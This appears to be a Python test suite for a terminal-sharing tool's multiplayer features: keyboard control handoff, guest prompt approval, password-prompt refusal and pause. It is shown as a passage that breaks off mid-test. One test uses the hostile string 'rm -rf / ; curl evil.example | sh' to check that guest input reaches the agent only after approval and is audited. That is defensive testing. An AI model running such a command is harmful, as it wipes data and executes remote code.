# SPDX-License-Identifier: AGPL-3.0-or-later
"""Multiplayer, part two: presence, the keyboard, guest prompts and pause (sections 10.3 to 10.6).

Everything here runs over the real rendezvous, real Noise sessions and the real hub, with two or
three clients connected at once — an owner's paired `full` device, an editor and a viewer — because
every rule being tested is about what one of them may do *while another one is doing something*.
A stub hub would be testing the stub.

Time is injected, never slept on: the queues in ``remote/guests.py`` take a clock, the hub takes
one for the presence grace period, and the lapses are applied by ``Host.expire_pending`` — which is
what the hub's own housekeeping task calls once a second.
"""
import asyncio
import contextlib
import json
import tempfile
import unittest
from pathlib import Path

from remote import client as client_mod
from remote import control as control_mod
from remote import guests as guests_mod
from remote import host as host_mod
from remote import identity as identity_mod
from remote import pairing
from remote import panes as panes_mod
from remote import wire, ws
from rendezvous.server import Store, build


def run(coroutine, timeout=30):
    return asyncio.run(asyncio.wait_for(coroutine, timeout))


class SharedSource(panes_mod.DemoPaneSource):
    """The demo source with a terminal behind it, so `keys` has somewhere to land.

    ``compose`` is recorded rather than run: what these tests care about is *whether* a guest's
    words reached the agent, with what routing and what origin, not the demo's scripted turn.
    """

    scrollback = True

    def __init__(self):
        super().__init__()
        self.composed: list[dict] = []
        self.plans_run: list[tuple[str, str, str]] = []
        self.typed: list[tuple] = []
        self.released: list[tuple[str, str]] = []
        self._screen_callbacks: list = []

    def on_screen(self, callback) -> None:
        self._screen_callbacks.append(callback)

    def screen_snapshot(self, pane: str) -> dict:
        return {"t": "screen_snapshot", "pane": pane, "rows": 4, "cols": 20, "alt": False,
                "cursor": {"row": 0, "col": 0, "visible": True, "shape": 0}, "lines": []}

    async def compose(self, pane: str, text: str, *, to_agent: bool, when: str, origin: str,
                      origin_name: str = "") -> None:
        self.composed.append({"pane": pane, "text": text, "to_agent": to_agent, "when": when,
                              "origin": origin, "origin_name": origin_name})
        # The queue row the desktop and every watching client see, shaped as the worker's is.
        self._emit(pane, {"event": "queued", "id": f"q{len(self.composed)}", "text": text,
                          "origin": origin, "author": origin_name})
        self._emit(pane, {"event": "queue_changed", "running": None, "items": [
            {"id": f"q{index + 1}", "preview": item["text"][:60], "origin": item["origin"]}
            for index, item in enumerate(self.composed)], "steering": []})

    async def plan_execute(self, pane: str, plan_id: str, origin: str) -> None:
        self.plans_run.append((pane, plan_id, origin))

    async def send_keys(self, pane: str, data: bytes, *, device: str) -> None:
        self.typed.append(("keys", pane, data, device))

    async def send_line(self, pane: str, text: str, *, device: str) -> None:
        self.typed.append(("line", pane, text, device))

    async def paste(self, pane: str, text: str, *, device: str) -> None:
        self.typed.append(("paste", pane, text, device))

    def release(self, pane: str, device: str) -> None:
        self.released.append((pane, device))

    def release_device(self, device: str) -> None:
        self.released.append(("", device))


class Harness:
    """A rendezvous, a desktop with two panes, and an owner who answers as the test tells them."""

    def __init__(self, admit=True, role=None):
        self.admit = admit
        self.role = role
        self.capability = wire.FULL
        self.approve_prompts: bool | None = True      # None: never answer
        self.grant_control: bool | None = True
        self.asked_prompts: list[host_mod.PromptRequest] = []
        self.asked_control: list[host_mod.ControlRequest] = []
        self.clock = [1000.0]

    async def __aenter__(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.directory = Path(self.temporary.name)
        self.store = Store(":memory:")
        self.server = build(self.store)
        await self.server.start("127.0.0.1", 0)
        self.base = f"http://127.0.0.1:{self.server.port}"

        self.identity = identity_mod.Identity.create(self.directory)
        self.devices = identity_mod.DeviceStore(self.directory)
        self.guests = guests_mod.GuestStore(self.directory, devices=self.devices)
        self.source = SharedSource()

        async def approver(request):
            return True, self.capability

        async def knock_approver(request):
            return self.admit, self.role or request.role

        async def prompt_approver(request):
            self.asked_prompts.append(request)
            if self.approve_prompts is None:
                await asyncio.Event().wait()          # the owner never answers
            return self.approve_prompts

        async def control_approver(request):
            self.asked_control.append(request)
            if self.grant_control is None:
                await asyncio.Event().wait()
            return self.grant_control

        self.host = host_mod.Host(self.identity, self.devices, self.source,
                                  app_base="https://app.example", approver=approver,
                                  knock_approver=knock_approver, guests=self.guests,
                                  prompt_approver=prompt_approver,
                                  control_approver=control_approver,
                                  clock=lambda: self.clock[0], name="test desktop")
        # The queues' own clocks, so ten minutes and sixty seconds are numbers, not waits.
        self.host.prompts = guests_mod.PromptQueue(now=lambda: self.clock[0])
        self.host.controls = guests_mod.ControlQueue(now=lambda: self.clock[0])
        await self.host.register(self.base)
        self.serving = asyncio.create_task(self.host.serve())
        for _ in range(100):
            await asyncio.sleep(0.02)
            if self.host.socket is not None:
                break
        return self

    async def __aexit__(self, *exc):
        await self.host.stop()
        self.serving.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await self.serving
        await self.server.close()
        self.store.close()
        self.temporary.cleanup()

    def tick(self, seconds: float) -> None:
        """Move every injected clock forward and apply what that made true."""
        self.clock[0] += seconds
        self.host.expire_pending()

    async def invite(self, panes=("pane-1",), role=wire.EDITOR, **kwargs):
        return await self.host.invite_create(list(panes), role, **kwargs)

    async def guest(self, role=wire.EDITOR, name="alice", panes=("pane-1",)):
        _, url = await self.invite(panes=panes, role=role)
        client = client_mod.Client(self.base)
        joined = await client.knock(url, name=name, platform="Chrome")
        await client.expect("panes")
        # A joiner is told the state of their pane straight away (10.3, 10.5). Take those here,
        # so a test that waits for `control` is waiting for a handoff and not for the greeting.
        await client.expect("control")
        await client.expect("share_state")
        await client.send({"t": "pane_focus", "pane": panes[0]})
        return client, joined

    async def owner_device(self, capability=wire.FULL):
        self.capability = capability
        url, _ = await self.host.open_pairing()
        pairing_client = client_mod.Client(self.base)
        record = await pairing_client.pair(url, name="Pixel 9", platform="Chrome")
        await pairing_client.close()
        client = client_mod.Client(self.base)
        await client.connect(record)
        await client.expect("panes")
        await client.send({"t": "pane_focus", "pane": "pane-1"})
        await client.expect("screen_snapshot")
        return client, record

    async def settle(self, rounds=8):
        for _ in range(rounds):
            await asyncio.sleep(0.02)

    def audit_lines(self):
        return [json.loads(line) for path in sorted(self.directory.glob("audit-*.jsonl"))
                for line in path.read_text().splitlines()]

    def audit_kinds(self):
        return [line["kind"] for line in self.audit_lines()]

    def pane_item(self, pane="pane-1") -> dict:
        return next(item for item in self.host._items() if item["id"] == pane)


def lines_typed(harness) -> list[str]:
    """The whole lines that reached the source. `control_request` writes an empty `keys` to the
    source to claim the pane, so counting everything it was sent counts that too."""
    return [text for kind, _, text, _ in harness.source.typed if kind == "line"]


async def drain(client, kind, timeout=5.0):
    """Every message of a kind that has arrived, without waiting for one that has not."""
    found = []
    with contextlib.suppress(asyncio.TimeoutError, wire.WireError):
        while True:
            found.append(await client.expect(kind, timeout=timeout))
            timeout = 0.15
    return found


# ---- the book, on its own ----------------------------------------------------------------------

class ControlBookTests(unittest.TestCase):
    """One state, three spellings (section 10.3)."""

    def setUp(self):
        self.changes = []
        self.book = control_mod.ControlBook(
            lambda pane, old, new: self.changes.append((pane, old.label, new.label)))

    def test_nobody_holding_is_the_owner(self):
        self.assertEqual(self.book.label("p1"), "owner")
        self.assertEqual(self.book.field("p1"), "human")
        self.assertIsNone(self.book.participant("p1"))

    def test_the_three_spellings_agree(self):
        self.book.grant("p1", "g1", "alice")
        self.assertEqual(self.book.label("p1"), "participant:g1")
        self.assertEqual(self.book.field("p1"), "participant:g1")
        self.assertEqual(self.book.participant("p1"), "g1")

    def test_a_device_is_the_owner_on_the_wire_and_a_device_in_the_pane_list(self):
        self.book.claim_device("p1", "dev1", "Pixel 9")
        self.assertEqual(self.book.label("p1"), "owner")
        self.assertEqual(self.book.field("p1"), "remote:dev1")
        self.assertIsNone(self.book.participant("p1"))

    def test_the_agent_taking_a_program_takes_it_from_a_guest(self):
        self.book.grant("p1", "g1", "alice")
        self.book.observe("p1", "agent")
        self.assertEqual(self.book.label("p1"), "agent")
        self.book.observe("p1", "human")
        self.assertEqual(self.book.label("p1"), "owner")

    def test_a_sources_human_never_takes_it_from_a_guest(self):
        """A guest's keystrokes do not move the desktop's own human/agent token, so "human" in a
        pane line is not the owner grabbing the keyboard back — `control_take` is."""
        self.book.grant("p1", "g1", "alice")
        self.assertFalse(self.book.observe("p1", "human"))
        self.assertFalse(self.book.observe("p1", "remote:guest:g1"))
        self.assertEqual(self.book.label("p1"), "participant:g1")

    def test_only_the_holder_may_release(self):
        self.book.grant("p1", "g1", "alice")
        self.assertFalse(self.book.release("p1", control_mod.PARTICIPANT, "g2"))
        self.assertTrue(self.book.release("p1", control_mod.PARTICIPANT, "g1"))
        self.assertEqual(self.book.label("p1"), "owner")

    def test_a_repeated_claim_is_not_a_handoff(self):
        self.book.claim_device("p1", "dev1", "Pixel 9")
        self.changes.clear()
        self.book.claim_device("p1", "dev1")          # the source echoing its own driver back
        self.assertEqual(self.changes, [])

    def test_typing_claims_a_free_keyboard_and_never_takes_one(self):
        """Section 6.6's implicit claim, and the three states in which it is not one."""
        self.assertTrue(self.book.claim_device("p1", "dev1", "Pixel 9", by_typing=True))
        self.assertEqual(self.book.field("p1"), "remote:dev1")
        # The same device typing again holds what it holds.
        self.assertTrue(self.book.may_type("p1", "dev1"))
        # Another device of the owner's does not take it by typing.
        self.assertFalse(self.book.may_type("p1", "dev2"))
        self.assertFalse(self.book.claim_device("p1", "dev2", by_typing=True))
        self.assertEqual(self.book.field("p1"), "remote:dev1")
        # Nor does one take it from a guest, or from the agent.
        self.book.grant("p1", "g1", "alice")
        self.assertFalse(self.book.claim_device("p1", "dev1", by_typing=True))
        self.book.observe("p1", "agent")
        self.assertFalse(self.book.claim_device("p1", "dev1", by_typing=True))

    def test_the_owners_keystroke_is_not_undone_by_the_phones_next_line(self):
        """#W5N2's live drive, shots 13a and 13b: the take-back has to outlast one keystroke."""
        self.book.claim_device("p1", "dev1", "Pixel 9", by_typing=True)
        self.assertTrue(self.book.take("p1"))
        self.assertEqual(self.book.label("p1"), "owner")
        self.assertIsNone(self.book.device("p1"))
        self.assertFalse(self.book.may_type("p1", "dev1"), "typing would take it straight back")
        self.assertFalse(self.book.claim_device("p1", "dev1", by_typing=True))
        # Asking for it is still allowed at any moment: the phone is the owner's, not a guest's.
        self.assertTrue(self.book.claim_device("p1", "dev1", "Pixel 9"))
        self.assertEqual(self.book.field("p1"), "remote:dev1")
        # And once it has been asked for, the pane is no longer "taken back".
        self.assertTrue(self.book.may_type("p1", "dev1"))

    def test_handing_it_back_leaves_the_keyboard_free(self):
        """A device that gives the keyboard up may take it again by typing: nobody took it."""
        self.book.claim_device("p1", "dev1", "Pixel 9")
        self.assertTrue(self.book.release("p1", control_mod.OWNER, "dev1"))
        self.assertTrue(self.book.may_type("p1", "dev1"))


# ---- control handoff ---------------------------------------------------------------------------

class ControlTests(unittest.TestCase):
    def test_the_owner_grants_and_the_editor_types(self):
        async def main():
            async with Harness() as harness:
                device, _ = await harness.owner_device()
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control_pending", timeout=10)
                handoff = await client.expect("control", timeout=10)
                self.assertEqual(handoff["holder"], f"participant:{joined.participant}")
                self.assertEqual(handoff["name"], "alice")
                self.assertEqual(harness.asked_control[0].name, "alice")

                # Everyone on the pane is told, the owner's own device included.
                seen = await drain(device, "control")
                self.assertEqual(seen[-1]["holder"], f"participant:{joined.participant}")
                people = (await drain(client, "participants"))[-1]
                self.assertTrue(people["items"][0]["driving"])
                self.assertTrue(people["items"][0]["you"])
                self.assertEqual(harness.pane_item()["control"],
                                 f"participant:{joined.participant}")

                await client.send({"t": "line", "pane": "pane-1", "text": "echo hello"})
                await harness.settle()
                self.assertEqual(harness.source.typed,
                                 [("line", "pane-1", "echo hello", f"guest:{joined.participant}")])
                self.assertIn("control_grant", harness.audit_kinds())
                line = next(entry for entry in harness.audit_lines() if entry["kind"] == "line")
                self.assertEqual(line["participant"], joined.participant)
                self.assertEqual(line["text"], "echo hello")
                await client.close()
                await device.close()
        run(main())

    def test_two_editors_but_only_one_holder(self):
        async def main():
            async with Harness() as harness:
                first, alice = await harness.guest(name="alice")
                second, bob = await harness.guest(name="bob")
                await first.send({"t": "control_request", "pane": "pane-1"})
                told = await first.expect("control", timeout=10)
                self.assertEqual(told["holder"], f"participant:{alice.participant}")
                self.assertEqual(harness.host.control_holder("pane-1"), alice.participant)
                # Everyone on the pane saw that, bob included: presence is not private.
                self.assertEqual((await drain(second, "control"))[-1]["holder"],
                                 f"participant:{alice.participant}")

                await second.send({"t": "control_request", "pane": "pane-1"})
                told = await second.expect("control", timeout=10)
                self.assertEqual(told["holder"], f"participant:{bob.participant}")
                self.assertEqual(harness.host.control_holder("pane-1"), bob.participant)

                # alice is told she lost it, and her keys stop landing.
                told = await drain(first, "control")
                self.assertEqual(told[-1]["holder"], f"participant:{bob.participant}")
                await first.send({"t": "keys", "pane": "pane-1", "bytes": "eA"})
                with self.assertRaises(wire.WireError) as caught:
                    await first.expect("never", timeout=5)
                self.assertEqual(caught.exception.code, "not_driving")
                self.assertEqual(harness.source.typed, [])
                await first.close()
                await second.close()
        run(main())

    def test_a_viewer_cannot_ask_for_the_keyboard(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.guest(role=wire.VIEWER)
                await client.send({"t": "control_request", "pane": "pane-1"})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("control_pending", timeout=5)
                self.assertEqual(caught.exception.code, "not_permitted")
                self.assertEqual(harness.asked_control, [])
                await client.close()
        run(main())

    def test_the_owners_keystroke_takes_it_back_mid_typing(self):
        """`control_take` is the GUI's line for the owner's own key going into the pane: no
        question, and anything of the guest's still in flight is refused."""
        async def main():
            async with Harness() as harness:
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control", timeout=10)
                await client.send({"t": "keys", "pane": "pane-1", "bytes": "eA"})
                await harness.settle()

                harness.host.take_control("pane-1")
                told = await client.expect("control", timeout=5)
                self.assertEqual(told["holder"], "owner")
                self.assertEqual(told["name"], "test desktop")

                await client.send({"t": "keys", "pane": "pane-1", "bytes": "eQ"})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("never", timeout=5)
                self.assertEqual(caught.exception.code, "not_driving")
                self.assertEqual([entry[2] for entry in harness.source.typed], [b"x"])
                self.assertIn("control_take", harness.audit_kinds())
                self.assertEqual(harness.pane_item()["control"], "human")
                await client.close()
        run(main())

    def test_the_holder_dropping_their_socket_loses_control(self):
        async def main():
            async with Harness() as harness:
                device, _ = await harness.owner_device()
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control", timeout=10)
                await client.close()                    # no `bye`, just gone
                for _ in range(100):
                    await asyncio.sleep(0.05)
                    if harness.host.control_holder("pane-1") is None:
                        break
                self.assertIsNone(harness.host.control_holder("pane-1"))
                told = await drain(device, "control")
                self.assertEqual(told[-1]["holder"], "owner")
                people = (await drain(device, "participants"))
                self.assertEqual(people, [], "a device is not sent the guest presence list")
                await device.close()
        run(main())

    def test_a_refused_request_says_so_and_a_lapsed_one_does_too(self):
        async def main():
            async with Harness() as harness:
                harness.grant_control = False
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control_pending", timeout=10)
                refused = await client.expect("control", timeout=10)
                self.assertEqual(refused["holder"], "owner")
                self.assertEqual(refused["reason"], "refused")
                self.assertIsNone(harness.host.control_holder("pane-1"))

                harness.grant_control = None             # nobody answers this one
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control_pending", timeout=10)
                self.assertIsNotNone(harness.host.controls.get("pane-1", joined.participant))
                harness.tick(guests_mod.CONTROL_LIFETIME + 1)
                lapsed = await client.expect("control", timeout=10)
                self.assertEqual(lapsed["reason"], "lapsed")
                self.assertIsNone(harness.host.control_holder("pane-1"))
                await client.close()
        run(main())

    def test_a_removed_or_demoted_holder_loses_the_keyboard_at_once(self):
        async def main():
            for what in ("removed", "demoted"):
                async with Harness() as harness:
                    client, joined = await harness.guest()
                    await client.send({"t": "control_request", "pane": "pane-1"})
                    await client.expect("control", timeout=10)
                    if what == "removed":
                        await harness.host.participant_remove(joined.participant)
                    else:
                        await harness.host.role_set(joined.participant, wire.VIEWER)
                    await harness.settle()
                    self.assertIsNone(harness.host.control_holder("pane-1"), what)
                    self.assertIn("control_revoke", harness.audit_kinds())
                    with contextlib.suppress(Exception):
                        await client.close()
        run(main())

    def test_an_expired_holder_loses_it_on_the_next_sweep(self):
        async def main():
            async with Harness() as harness:
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control", timeout=10)
                record = harness.guests.participants[joined.participant]
                record.expires = 0.0                     # their invite ran out while they sat there
                harness.tick(1)
                self.assertIsNone(harness.host.control_holder("pane-1"))
                with contextlib.suppress(Exception):
                    await client.close()
        run(main())

    def test_the_owners_own_device_and_a_guest_share_one_state(self):
        """An owner's `full` device taking over is the same token, so a guest sees `owner` and
        the pane list says which device — there is no second holder beside the first."""
        async def main():
            async with Harness() as harness:
                device, record = await harness.owner_device()
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control", timeout=10)

                await device.send({"t": "control_request", "pane": "pane-1"})
                await device.expect("agent", timeout=10)
                told = await client.expect("control", timeout=10)
                self.assertEqual(told["holder"], "owner", "a device of the owner's is the owner")
                self.assertNotIn(record.device_id, json.dumps(told))
                self.assertEqual(harness.pane_item()["control"], f"remote:{record.device_id}")
                self.assertIsNone(harness.host.control_holder("pane-1"))

                await device.send({"t": "control_release", "pane": "pane-1"})
                await harness.settle()
                self.assertEqual(harness.pane_item()["control"], "human")
                await client.close()
                await device.close()
        run(main())

    def test_the_phone_and_a_guest_never_both_hold_the_keyboard(self):
        """#W5N2's live drive found them both believing they had it (shots 13a, 13b)."""
        async def main():
            async with Harness() as harness:
                device, record = await harness.owner_device()
                client, joined = await harness.guest()

                await device.send({"t": "control_request", "pane": "pane-1"})
                await device.expect("agent", timeout=10)
                self.assertEqual(harness.pane_item()["control"], f"remote:{record.device_id}")
                mine = (await drain(device, "control"))[-1]
                self.assertEqual(mine["holder"], "owner")
                self.assertEqual(mine["device"], record.device_id,
                                 "the phone cannot follow a handoff it cannot recognise")
                theirs = (await drain(client, "control"))[-1]
                self.assertEqual(theirs["holder"], "owner")
                self.assertNotIn("device", theirs, "a guest is never told which device it is")

                # The owner hands the keyboard to the guest. There is one token, so the phone
                # loses it — is told so, and is refused when it types anyway.
                harness.host.grant_control("pane-1", joined.participant)
                told = (await drain(device, "control"))[-1]
                self.assertEqual(told["holder"], f"participant:{joined.participant}")
                self.assertNotIn("device", told)
                await device.send({"t": "line", "pane": "pane-1", "text": "echo from the phone"})
                with self.assertRaises(wire.WireError) as caught:
                    await device.expect("never", timeout=5)
                self.assertEqual(caught.exception.code, "not_driving")
                self.assertEqual(lines_typed(harness), [])
                self.assertEqual(harness.pane_item()["control"],
                                 f"participant:{joined.participant}")
                await client.close()
                await device.close()
        run(main())

    def test_the_owners_keystroke_takes_the_pane_back_from_their_own_phone(self):
        """Section 10.3: the keystroke takes control back from *whoever* holds it, and what the
        phone sends next is refused like anybody else's."""
        async def main():
            async with Harness() as harness:
                device, record = await harness.owner_device()
                await device.send({"t": "control_request", "pane": "pane-1"})
                await device.expect("agent", timeout=10)
                await device.send({"t": "line", "pane": "pane-1", "text": "echo driving"})
                await harness.settle()
                self.assertEqual(lines_typed(harness), ["echo driving"])

                # The owner typed in the pane: `control_take` from the desktop (10.5).
                self.assertTrue(harness.host.take_control("pane-1"))
                back = (await drain(device, "control"))[-1]
                self.assertEqual(back["holder"], "owner")
                self.assertNotIn("device", back, "nobody remote holds it now")
                self.assertEqual(harness.pane_item()["control"], "human")

                await device.send({"t": "line", "pane": "pane-1", "text": "echo after the owner"})
                with self.assertRaises(wire.WireError) as caught:
                    await device.expect("never", timeout=5)
                self.assertEqual(caught.exception.code, "not_driving")
                self.assertEqual(lines_typed(harness), ["echo driving"],
                                 "the second line must not land")
                self.assertIn("control_take", harness.audit_kinds())

                # Taking it over again is one tap, and then the phone types as before.
                await device.send({"t": "control_request", "pane": "pane-1"})
                await device.expect("agent", timeout=10)
                await device.send({"t": "line", "pane": "pane-1", "text": "echo asked again"})
                await harness.settle()
                self.assertEqual(lines_typed(harness), ["echo driving", "echo asked again"])
                await device.close()
        run(main())

    def test_the_owners_own_device_is_told_who_is_on_the_pane(self):
        """Section 10.3 fans `participants` out to everyone on the pane — the owner's devices
        included, or the phone cannot show who is here."""
        async def main():
            async with Harness() as harness:
                device, _ = await harness.owner_device()
                client, joined = await harness.guest()
                people = (await drain(device, "participants"))[-1]
                self.assertEqual(people["pane"], "pane-1")
                self.assertEqual([item["name"] for item in people["items"]], ["alice"])
                self.assertFalse(any(item["you"] for item in people["items"]),
                                 "a device is not one of the participants")
                self.assertTrue(all(item["online"] for item in people["items"]))

                # And on every handoff, with `driving` following the one book.
                harness.host.grant_control("pane-1", joined.participant)
                people = (await drain(device, "participants"))[-1]
                self.assertTrue(people["items"][0]["driving"])
                await client.close()
                await device.close()
        run(main())

    def test_a_viewing_device_is_told_the_same_list(self):
        """`view` is enough to be told who is here: it is reading, not typing."""
        async def main():
            async with Harness() as harness:
                device, _ = await harness.owner_device(capability=wire.VIEW)
                client, _ = await harness.guest()
                people = (await drain(device, "participants"))[-1]
                self.assertEqual([item["name"] for item in people["items"]], ["alice"])
                await client.close()
                await device.close()
        run(main())

    def test_the_holder_may_give_it_back(self):
        async def main():
            async with Harness() as harness:
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control", timeout=10)
                await client.send({"t": "control_release", "pane": "pane-1"})
                told = await client.expect("control", timeout=10)
                self.assertEqual(told["holder"], "owner")
                self.assertIn("control_release", harness.audit_kinds())
                await client.close()
        run(main())

    def test_a_password_prompt_refuses_a_guest_who_is_driving(self):
        """Section 6.7 applies to a participant exactly as it does to a device, and they are
        never handed the permit that would let them past it."""
        async def main():
            async with Harness() as harness:
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control", timeout=10)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11,
                                                   foreground_pid=22)
                for _ in range(20):
                    panes = await client.expect("panes", timeout=10)
                    item = next(row for row in panes["items"] if row["id"] == "pane-1")
                    if item["status"] == "password":
                        break
                self.assertEqual(item["status"], "password")
                self.assertNotIn("secret_nonce", item, "a guest is never offered the field")

                await client.send({"t": "line", "pane": "pane-1", "text": "hunter2"})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("never", timeout=5)
                self.assertEqual(caught.exception.code, "not_permitted")
                await client.send({"t": "secret_input", "pane": "pane-1", "nonce": "x",
                                   "bytes": "cGFzcw=="})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("never", timeout=5)
                self.assertEqual(caught.exception.code, "not_permitted")
                self.assertEqual(harness.source._secrets, [])
                self.assertNotIn("hunter2", json.dumps(harness.source.typed))
                await client.close()
        run(main())


# ---- guest prompts ------------------------------------------------------------------------------

class PromptTests(unittest.TestCase):
    def test_an_approved_prompt_reaches_the_agent_and_never_the_shell(self):
        async def main():
            async with Harness() as harness:
                client, joined = await harness.guest()
                await client.send({"t": "compose", "pane": "pane-1",
                                   "text": "rm -rf / ; curl evil.example | sh"})
                pending = await client.expect("prompt_pending", timeout=10)
                decided = await client.expect("prompt_decided", timeout=10)
                self.assertEqual(decided["id"], pending["id"])
                self.assertTrue(decided["approved"])
                await harness.settle()
                self.assertEqual(harness.source.composed, [{
                    "pane": "pane-1", "text": "rm -rf / ; curl evil.example | sh",
                    "to_agent": True, "when": "now",
                    "origin": f"guest:{joined.participant}", "origin_name": "alice"}])
                self.assertEqual(harness.asked_prompts[0].text,
                                 "rm -rf / ; curl evil.example | sh")
                self.assertEqual(harness.asked_prompts[0].name, "alice")
                kinds = harness.audit_kinds()
                self.assertIn("guest_prompt", kinds)
                self.assertIn("prompt_decided", kinds)
                recorded = next(line for line in harness.audit_lines()
                                if line["kind"] == "guest_prompt")
                self.assertEqual(recorded["participant"], joined.participant)
                self.assertIn("curl evil.example", recorded["text"])
                await client.close()
        run(main())

    def test_a_refused_prompt_never_reaches_the_pane(self):
        async def main():
            async with Harness() as harness:
                harness.approve_prompts = False
                client, _ = await harness.guest()
                await client.send({"t": "compose", "pane": "pane-1", "text": "ship it"})
                await client.expect("prompt_pending", timeout=10)
                decided = await client.expect("prompt_decided", timeout=10)
                self.assertFalse(decided["approved"])
                self.assertEqual(decided["reason"], "refused")
                await harness.settle()
                self.assertEqual(harness.source.composed, [])
                self.assertEqual(harness.host.prompts.pending, {})
                await client.close()
        run(main())

    def test_a_lapsed_prompt_never_reaches_the_pane(self):
        async def main():
            async with Harness() as harness:
                harness.approve_prompts = None            # the owner walks away
                client, _ = await harness.guest()
                await client.send({"t": "compose", "pane": "pane-1", "text": "ship it"})
                pending = await client.expect("prompt_pending", timeout=10)
                harness.tick(guests_mod.PROMPT_LIFETIME + 1)
                decided = await client.expect("prompt_decided", timeout=10)
                self.assertEqual(decided["id"], pending["id"])
                self.assertFalse(decided["approved"])
                self.assertEqual(decided["reason"], "lapsed")
                await harness.settle()
                self.assertEqual(harness.source.composed, [])
                await client.close()
        run(main())

    def test_a_demoted_guest_is_told_their_waiting_prompt_will_not_run(self):
        async def main():
            async with Harness() as harness:
                harness.approve_prompts = None
                client, joined = await harness.guest()
                await client.send({"t": "compose", "pane": "pane-1", "text": "ship it"})
                pending = await client.expect("prompt_pending", timeout=10)
                await harness.host.role_set(joined.participant, wire.VIEWER)
                decided = await client.expect("prompt_decided", timeout=10)
                self.assertEqual(decided["id"], pending["id"])
                self.assertFalse(decided["approved"])
                self.assertEqual(decided["reason"], "removed")
                await client.close()
        run(main())

    def test_a_prompt_of_a_guest_who_was_removed_is_dropped_and_a_late_yes_does_nothing(self):
        async def main():
            for what in ("removed", "demoted", "share ended"):
                async with Harness() as harness:
                    harness.approve_prompts = None
                    client, joined = await harness.guest()
                    await client.send({"t": "compose", "pane": "pane-1", "text": "ship it"})
                    pending = await client.expect("prompt_pending", timeout=10)
                    if what == "removed":
                        await harness.host.participant_remove(joined.participant)
                    elif what == "demoted":
                        await harness.host.role_set(joined.participant, wire.VIEWER)
                    else:
                        await harness.host.share_end("pane-1")
                    await harness.settle()
                    self.assertEqual(harness.host.prompts.pending, {}, what)
                    # The owner's answer arrives after the fact and changes nothing.
                    self.assertFalse(harness.host.decide_prompt(pending["id"], True), what)
                    await harness.settle()
                    self.assertEqual(harness.source.composed, [], what)
                    with contextlib.suppress(Exception):
                        await client.close()
        run(main())

    def test_prompts_immediate_runs_it_without_asking_and_still_records_it(self):
        async def main():
            async with Harness() as harness:
                harness.host.set_share_options("pane-1", prompts_immediate=True)
                client, joined = await harness.guest()
                await client.send({"t": "compose", "pane": "pane-1", "text": "ship it",
                                   "when": "queue"})
                await client.expect("prompt_pending", timeout=10)
                decided = await client.expect("prompt_decided", timeout=10)
                self.assertTrue(decided["approved"])
                await harness.settle()
                self.assertEqual(harness.asked_prompts, [], "nobody was asked")
                self.assertEqual(harness.source.composed[0]["to_agent"], True)
                self.assertEqual(harness.source.composed[0]["when"], "queue")
                self.assertEqual(harness.source.composed[0]["origin"],
                                 f"guest:{joined.participant}")
                kinds = harness.audit_kinds()
                self.assertIn("guest_prompt", kinds)
                self.assertIn("share_options", kinds)
                await client.close()
        run(main())

    def test_a_guests_plan_execute_is_a_prompt(self):
        async def main():
            async with Harness() as harness:
                client, joined = await harness.guest()
                await client.send({"t": "plan_execute", "pane": "pane-1", "plan_id": "abc123"})
                await client.expect("prompt_pending", timeout=10)
                self.assertEqual(harness.asked_prompts[0].plan_id, "abc123")
                await client.expect("prompt_decided", timeout=10)
                await harness.settle()
                self.assertEqual(harness.source.plans_run,
                                 [("pane-1", "abc123", f"guest:{joined.participant}")])
                await client.close()
        run(main())

    def test_a_guest_never_sees_another_guests_prompt_text(self):
        async def main():
            async with Harness() as harness:
                alice, alice_id = await harness.guest(name="alice")
                bob, bob_id = await harness.guest(name="bob")
                await alice.send({"t": "compose", "pane": "pane-1",
                                  "text": "the secret merger memo"})
                await alice.expect("prompt_decided", timeout=10)
                await harness.settle()

                for event in (await drain(bob, "agent")):
                    body = json.dumps(event)
                    self.assertNotIn("the secret merger memo", body)
                mine = [event["event"] for event in (await drain(alice, "agent"))
                        if event["event"]["event"] == "queued"]
                self.assertTrue(any("the secret merger memo" == row.get("text") for row in mine),
                                "a guest still sees their own prompt")
                queues = [event["event"] for event in (await drain(bob, "agent"))
                          if event["event"]["event"] == "queue_changed"]
                for event in queues:
                    for row in event.get("items", []):
                        self.assertNotIn("preview", row)
                        self.assertEqual(row.get("author"), "alice")
                await alice.close()
                await bob.close()
        run(main())

    def test_three_prompts_may_wait_and_a_fourth_is_refused(self):
        async def main():
            async with Harness() as harness:
                harness.approve_prompts = None
                client, _ = await harness.guest()
                for index in range(guests_mod.PROMPTS_PER_GUEST):
                    await client.send({"t": "compose", "pane": "pane-1", "text": f"one {index}"})
                    await client.expect("prompt_pending", timeout=10)
                await client.send({"t": "compose", "pane": "pane-1", "text": "one too many"})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("prompt_pending", timeout=5)
                self.assertEqual(caught.exception.code, "busy")
                await client.close()
        run(main())


# ---- pause and "only while I am present" ---------------------------------------------------------

class PauseTests(unittest.TestCase):
    def test_pause_refuses_input_and_prompts_and_takes_the_keyboard_back(self):
        async def main():
            async with Harness() as harness:
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control", timeout=10)

                harness.host.share_pause("", True)
                state = await client.expect("share_state", timeout=10)
                self.assertTrue(state["paused"])
                self.assertEqual(state["reason"], "owner")
